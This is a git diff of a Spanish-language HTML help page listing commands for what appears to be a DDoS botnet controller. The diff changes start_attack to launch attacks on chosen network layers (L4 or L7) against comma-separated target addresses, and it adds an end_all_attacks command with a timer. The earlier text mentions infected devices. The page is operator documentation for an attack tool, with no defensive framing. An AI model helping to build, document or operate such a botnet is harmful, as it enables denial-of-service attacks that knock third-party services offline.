@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Command List</title>
+    <title>Lista de comandos</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -28,7 +28,33 @@
             </li>
             <li>
                 <h2>start_attack:</h2>
-                <p>Este comando hace que el servidor busque los dispositivos infectados disponibles.</p>
+                <p>Este comando empieza un ataque.</p>
+                <h5>Argumentos:</h5>
+                <ol>
+                    <li>
+                        Layer:
+                        <p>Introduce la capa a la que se va a dirigir el ataque, de ello dependerá también el tipo de ataque, valores válidos: L4, L7. <a href="ddos_types.html" target="_blank">Más información</a></p>
+                    </li>
+                    <li>
+                        Objetivo del ataque:
+                        <p>Introduce el objetivo del ataque, si quieres atacar varios objetivos al mismo tiempo, sepáralos por comas. Ej.: "192.0.0.1:80/ejemplo,192.0.0.14:80/ejemplo2"</p>
+                    </li>
+                </ol>
+            </li>
+            <li>
+                <h2>end_all_attacks:</h2>
+                <p>Este comando termina todos los ataques en curso.</p>
+                <h5>Argumentos:</h5>
+                <ol>
+                    <li>
+                        Minutos:
+                        <p>Tiempo, en minutos, en el que cesará el ataque. En el caso de estar vacío, cesará al instante.</p>
+                    </li>
+                    <li>
+                        Objetivo del ataque:
+                        <p>Introduce el objetivo del ataque, si quieres atacar varios objetivos al mismo tiempo, sepáralos por comas. Ej.: "192.0.0.1:80/ejemplo,192.0.0.14:80/ejemplo2"</p>
+                    </li>
+                </ol>
             </li>
 
         </ul>
